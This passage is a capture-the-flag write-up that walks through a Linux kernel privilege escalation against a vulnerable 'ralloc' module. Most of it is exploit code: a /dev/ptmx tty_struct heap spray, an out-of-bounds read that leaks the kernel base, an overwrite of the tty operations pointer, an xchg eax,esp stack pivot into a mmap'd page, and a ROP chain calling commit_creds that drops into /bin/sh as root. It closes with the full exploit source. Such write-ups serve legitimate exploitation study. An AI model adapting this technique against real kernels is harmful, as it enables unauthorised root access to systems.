**Reference** : https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/tty.h#L283

***

Considering the above, I then focused on a writeup wrote by the same author for the challenge he created, which can be found [here](https://hackmd.io/@ptr-yudai/rJp1TpbBU), this if try to compare from the `ralloc`, the initial methodology seems to be same.

Apparently, going in-depth on why this `/dev/ptmx` is the best target would be better for a seperate post itself, so I am leaving the unncessary part in this challenge context and will explain the things as we move on. To replicate the same methodology to get the RIP control, firstly I allocated a chunk of size `0x400` which was the meximun size the ioctl can allocate the chunk of and I also opened the `ptmx` device.

I turned off the KASLR on the QEMU instance and already got the address of the function we needed:-

* `commit_creds`
* `ptm_unix98_ops`
* `prepare_kernel_creds`

```C
int main() {
  unsigned long buf[0x420 / sizeof(unsigned long)];
  /* open drivers */
  int fd = open("/dev/ralloc", O_RDONLY);
  if (fd < 0) {
    perror("/dev/ralloc");
    return 1;
  }

  for(int i=0; i<0x100; i++)
 {
   spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
 }


  kmalloc(fd, 0, 0x400);
  get(fd, 0, 0x420, &buf);
  return 0;
}
```
Now, doing so, upon setting up a breakpoint at the `rope2_ioctl`'s `kmalloc` call and stepping to it, we see the heap structure as:-

> Note: Before debugging do: `add-symbol-file ralloc.ko 0xffffffffc0002000` in the `gdb-gef`.

Then, moving on, setup a breakpoint at the `b *rope2_ioctl + 342` and then running the program, once it hits the breakpoint, when we see the memory:-

![](/img/ropetwo/kmalloc.png)

Now, considering that, if we see for the memory content, the `ptm_unix98_ops` object was at `heap.size + 32`, since `heap.size` was `0x400`, the `ptm_uniz98_ops` was at the `0x420`. Using the `get` function, we can have the leak:-

![](/img/ropetwo/leak.png)


Now, since we have a leak, this will be useful in retrieving the base address to calculate the address of the function and gadget we will need, for now, since the structure as defined, if we can overwrite the `*ops` with the help of the fake `tty_operations` array created from the userland, we can have the RIP control.

> The POC for `tty_struct` and RIP control can be understood from here: <https://www.lazenca.net/pages/viewpage.action?pageId=29327365#id-07.Use-After-Free(UAF)(feat.tty_struct)-PoCcode>

Now compiling the exploit:-

```C

unsigned long kbase, kheap;
unsigned long ptm_unix98_ops = 0x10af6a0;
unsigned long pop_rdi, kpti;
unsigned long init_creds = 0x165fa00;
unsigned long commit_creds = 0xc0540;

void *fake_tty_operations[30];

int spray_fd[0x100];


//[..snip..] 

int main() {
  unsigned long buf[0x420 / sizeof(unsigned long)];
  /* open drivers */
  int fd = open("/dev/ralloc", O_RDONLY);
  if (fd < 0) {
    perror("/dev/ralloc");
    return 1;
  }

  for(int i=0; i<0x100; i++)
 {
   spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
 }

  kmalloc(fd, 0, 0x400);
  get(fd, 0, 0x420, &buf);
  kbase = buf[131] - ptm_unix98_ops;

  printf("[*] Leak                :   %p\n", buf[131]);

  if (buf[131] & 0xfff != 0x6a0)
  {
    printf("[!] Error, exploit failed.\n");
    exit(-1);
  }
  printf("[*] Base                :   %p\n", kbase);
  printf("[*] Gadget              :   %p\n", kbase + 0xb55c7);
  commit_creds = kbase + commit_creds;
  init_creds = kbase + init_creds;
  pop_rdi = kbase + 0x8b8a0;      // pop rdi; ret
  kpti = kbase + 0xc00a34;       // swapgs_restore_regs_and_return_to_usermode
  printf("[*] init_creds:   %p\n", init_creds);
  printf("[*] commit_creds        :   %p\n", commit_creds);
  printf("[*] get_shell            :   %p\n", &get_shell);
  printf("[!] DEBUG....:");
  getchar();
  fake_tty_operations[12] = 0xdeadbeef;
  buf[131] = &fake_tty_operations;

  fill(fd, 0, 0x420, &buf);
  for(int i=0; i<0x100; i++)
  {
    ioctl(spray_fd[i], 0, 0);
  }
  return 0;
}
```

Doing the above, we get the RIP overwritten as `0xdeadbeef`.

![](/img/ropetwo/deadbeef.png)

Now, moving on, we will have to somehow execute the ROP chain which will be `commit_creds(init_creds())`, and call a function which will spawn shell. As for my initial research, I found out that we can use a gadget like `xchg eax, esp` and `mmap` a memory region with the lower 32 bit address of the gadget and store our ROP chain to it, which once the RIP hits the gadget, would exchange the `eax` and `esp` would execute instructions from the `mmap`'d region. To do this, I change the 12th index of the `fake_tty_operations` to the address of the `xchg eax, esp` gadget and set a breakpoint at the address within gdb:

> The gadget was found with the help of ROPGadget and is from the `.text` section because of r/w permissions. `

```C
  fake_tty_operations[12] = kbase + 0x4cba4;
  buf[131] = &fake_tty_operations;

  fill(fd, 0, 0x420, &buf);
  for(int i=0; i<0x100; i++)
```

![](/img/ropetwo/gadget.png)

If we step into the instruction and see the values of both `eax` & `esp`, we will see:-

![](/img/ropetwo/esp.png)

As seen above, the `rsp` is now pointing to the loweer 32 bit address of the gadget, now, we can `mmap` a shared memory page such that it'll be accessible between the kernel and the userland space with:-

```C
void *mapped = mmap(pivot_target & 0xfffff000, 0x1000000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE | MAP_POPULATE, 0, 0);
```
Now, time to craft a ROP chain which will be stored in the shared memory region, following is the ROP chain I created:-

```C
  unsigned long long user_rflags, user_cs, user_ss, user_sp;
	asm volatile(
		"mov %0, %%cs\n"
		"mov %1, %%ss\n"
		"mov %2, %%rsp\n"
		"pushfq\n"
		"pop %3\n"
		: "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
	);

    unsigned long long rop[] = {
         pop_rdi, // pop rdi
         init_creds,
         commit_creds,
         swapgs,
         0xdeadbeef,
         iretq,
         get_shell,
         user_cs,
         user_rflags,
         user_sp,
        user_ss,
    };
```

Now, to explain the ROP chain, let's break down:-

* `pop rdi; ret` this will pop the `rdi` register which is responsible for holding the 1st arguument in the x86_64 systems.
* `init_creds`: This will be given into the `rdi`.
* `commit_creds`, doing so, when the the RIP will reach the `commit_creds`, it'll execute it as `commit_creds(init_creds())` which will change the `UID` for the running process to `0`.
* Then, `swapgs` will let the it back to the userland safely because of the SMAP and KASLR being enabled, then `0xdeadbeef` for the padding.
* `iretq` will store the the flags and register and the RIP.
* Followed by the `get_shell` function, this will be the RIP.
* Rest flags would be restored and will be considered.

Now, the final exploit looks like this:-

```C
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include<linux/userfaultfd.h>
#include <sys/timerfd.h>
#include <pthread.h>
#include <poll.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>

unsigned long kbase, kheap;
unsigned long ptm_unix98_ops = 0x10af6a0;
unsigned long pop_rdi, kpti;
unsigned long init_creds = 0x165fa00;
unsigned long commit_creds = 0xc0540;

void *fake_tty_operations[30];

int spray_fd[0x100];

struct message {
  unsigned int index;
  long size;
  char *buf;
};


void kmalloc(int fd, unsigned long idx, unsigned long size)
{
  struct message msg;
  msg.size = size;
  msg.index = idx;
  printf("[*] Allocating Chunk at: %ld of size: %ld\n", idx, size);
  if (ioctl(fd, 0x1000, &msg) == -1)
  {
   puts("Error!!");
   exit(1);
  }
}

void kfree(int fd, unsigned long idx)
{
 struct message msg;
 msg.index = idx;
 printf("[*] Free'ng index: %ld\n", idx);
 if (ioctl(fd, 0x1001, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}

void fill(int fd, unsigned long idx, unsigned int size, char *ptr)
{
 struct message msg;
 msg.buf = ptr;
 msg.index = idx;
 msg.size = size;
 printf("[*] Filling Chunk at Index: %ld with %s\n", idx, ptr);
 if (ioctl(fd, 0x1002,  &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}


void get(int fd, unsigned long idx, unsigned long size, char *ptr)
{
 struct message msg;
 msg.index = idx;
 msg.size = size;
 msg.buf = ptr;
 printf("[*] Reading data from index: %ld\n", idx);
   if (ioctl(fd, 0x1003, &msg) == -1)
 {
  puts("Error!!");
  exit(1);
 }
}

void get_shell()
{
    printf("is system?\n");
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}



int main() {
  unsigned long buf[0x420 / sizeof(unsigned long)];
  /* open drivers */
  int fd = open("/dev/ralloc", O_RDONLY);
  if (fd < 0) {
    perror("/dev/ralloc");
    return 1;
  }

  for(int i=0; i<0x100; i++)
 {
   spray_fd[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
 }

  /* leak kbase & kheap */
  //int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
  kmalloc(fd, 0, 0x400);
  get(fd, 0, 0x420, &buf);
  kbase = buf[131] - ptm_unix98_ops;
  buf[19] = 0xdeadbeef;

  printf("[*] Leak                :   %p\n", buf[131]);
  printf("[*] Base                :   %p\n", kbase);
  printf("[*] Gadget              :   %p\n", kbase + 0xb55c7);
  commit_creds = kbase + commit_creds;
  init_creds = kbase + init_creds;
  pop_rdi = kbase + 0x8b8a0;      // pop rdi; ret
  unsigned long mov_rdi_rax = kbase + 0xffffffff813153bc - 0xffffffff81000000;
  printf("[*] init_creds:   %p\n", init_creds);
  printf("[*] commit_creds        :   %p\n", commit_creds);
  printf("[*] get_shell            :   %p\n", &get_shell);
  printf("[!] DEBUG....:");
  getchar();
  fake_tty_operations[12] = kbase + 0x4cba4;
  buf[131] = &fake_tty_operations;


  unsigned long iretq = kbase + 0xffffffff810379fb - 0xffffffff81000000;
  unsigned long swapgs = kbase + 0xffffffff81074b54 - 0xffffffff81000000;
  unsigned long pivot_target = kbase + 0x4cba4 & 0xffffffff;
  unsigned long *fake_stack = &pivot_target;
  void *mapped = mmap(pivot_target & 0xfffff000, 0x1000000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE | MAP_POPULATE, 0, 0);
  printf("mmap'd chunk:       %p\n", mapped);
  printf("pivot_target:       %p\n", pivot_target);

  unsigned long prepare_kernel_creds = kbase + 0xc07a0;
  unsigned long long user_rflags, user_cs, user_ss, user_sp;
	asm volatile(
		"mov %0, %%cs\n"
		"mov %1, %%ss\n"
		"mov %2, %%rsp\n"
		"pushfq\n"
		"pop %3\n"
		: "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
	);

  unsigned long long rop[] = {
         pop_rdi, // pop rdi
         init_creds,
         commit_creds,
         swapgs,
         0xdeadbeef,
         iretq,
         get_shell,
         user_cs,
         user_rflags,
         user_sp,
        user_ss,
    };
 memcpy((void *)(kbase + 0x4cba4 & 0xffffffff), rop, sizeof(rop));
 puts("[*] Finished writing rop chain to mmap'd page");

  fill(fd, 0, 0x420, &buf);
  for(int i=0; i<0x100; i++)
  {
  	ioctl(spray_fd[i], 0, 0);
  }
  return 0;
}
```

Repacking the `initramfs.cpio` with the compiled exploit and running it:-

> Compile it with the `gcc -static -masm=intel xpl.c -o xpl`

![](/img/ropetwo/rop.png)

Now continuing the execution, we will get `root` on the QEMU instace.

![](/img/ropetwo/qemu_root.png)

Now, the exploit is ready, bear in mind the exploit is not very reliable like of those standard exploit one can compile, run and poof, root. For the one I created, I had to reset the machine quite few times, but after some tries, I got the root:-

> The reason I ran the exploit as `chromeuser` to get `root` is because the LKM was accessible with the both `r4j` and `chromeuser`.

![](/img/ropetwo/root.png)


Thank you!!!


